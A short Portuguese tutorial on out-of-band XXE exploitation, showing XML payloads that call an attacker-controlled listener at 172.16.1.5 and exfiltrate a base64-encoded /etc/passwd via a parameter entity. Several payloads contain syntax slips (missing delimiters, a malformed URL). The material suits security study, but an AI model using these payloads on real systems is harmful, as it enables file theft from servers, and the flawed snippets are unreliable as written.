
o XXE OOB ocorre quando uma aplicação processa um arquivo XML de maneira insegura e permite que um atacante faça a requisição de uma entidade externa, mas, ao invés de retornar a resposta diretamente, o servidor envia os dados para um destino externo controlado pelo atacante.

Primeiramente vamos começar abrindo um servidor na nossa máquina e manipular o XML para se comunicar com nosso servidor para confirmar a existencia de XXE.
```
<!DOCTYPE crowsec
[
<!ENTITY test SYSTEM "http://172.16.1.5:8080/test">
]
<root>&test</root>
```
Dentro XML é possivel fazer com que uma entidade tenha um parametrô e não um valor:
```
<!DOCTYPE crowsec
[
<!ENTITY test SYSTEM "http://172.16.1.5:8080/test">
%test;
]
<root>saavreeddd</root>
```
 No XML é possível ler arquivos e pegar o output e colocar dentro de uma entidade, então dentro do XML vamos ler um arquivo de dentro do nosso servidor e salvar seu conteúdo dentro de uma entidade no XML entidade;
Dentro do nosso payload vamos concatenar entidades:
```
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % payload "<!ENTITY remote SYSTEM 'http:172.16.1.5:8000/?leak=&file;'>">
```
Objetivo é concater a entidade file com a entidade remote e rodar a entidade remote, pois ela vai executar o comando system enviando o conteudo de /etc/passwd para nosso servidor. Porem quando passamos uma entidade dentro de outra, qualquer caracter especial reservado para entidades, ele precisa para por um processo de HTML encode numerico.
```
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'http:172.16.1.5:8000/?leak=&file;'>">
&payload
```